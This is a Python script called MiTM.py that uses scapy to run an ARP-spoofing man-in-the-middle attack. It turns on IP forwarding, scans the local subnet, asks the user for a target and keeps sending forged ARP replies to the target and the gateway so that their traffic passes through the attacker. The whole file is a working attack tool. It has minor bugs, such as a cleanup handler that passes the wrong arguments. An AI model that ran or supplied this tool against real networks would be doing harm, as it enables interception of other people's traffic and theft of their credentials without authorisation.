#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess
import argparse
import signal
import os
import sys
import time

ipr = subprocess.Popen(['/sbin/ip', 'route'], stdout=subprocess.PIPE).communicate()[0].split()
gateway = ipr[2]
interface = ipr[4]
target = None

def forward_ip(enable=True):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fw:
        if enable:
            ret = subprocess.Popen(['echo', '1'], stdout=fw)
        else:
            ret = subprocess.Popen(['echo', '0'], stdout=fw)
        if ret == 1:
            logging.error("ERROR SETTING IP FORWARDING")
            sys.exit(1)


def get_MAC(ip):
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2)
    for s,r in ans:
        return r[Ether].src

def arp_poison(gateway, target):
    gateway_mac = get_MAC(gateway)
    target_mac = get_MAC(target)
    while True:
        send(ARP(op=2, pdst=target, psrc=gateway, hwdst=target_mac))
        send(ARP(op=2, pdst=gateway, psrc=target, hwdst=gateway_mac))
        time.sleep(2)


def arp_restore(signum, frame):
    print("[+] Restoring ARP")
    gateway_mac = get_MAC(gateway)
    target_mac = get_MAC(target)
    send(ARP(op=2, pdst=gateway, psrc=target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=3)
    send(ARP(op=2, pdst=target, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=3)



if __name__ == "__main__":

    if os.geteuid() != 0:
        print("[-] You must run as root.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description='MiTM.py - Performs ARP Spoofing for MiTM attack.')
    parser.add_argument('-t', '--target', dest='target_ip', type=str, required=False, help="IP Address of target")
    args = parser.parse_args()


    forward_ip()
    if not args.target_ip:
        ip_range = '.'.join(gateway.split('.')[:-1]) + '.0/24'
        print(arping(ip_range))
        target = raw_input("Target: ")
    else:
        target = args.target_ip

    def signal_handler(signal, frame):
        forward_ip(False)
        arp_restore(gateway, target)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    arp_poison(gateway,target)
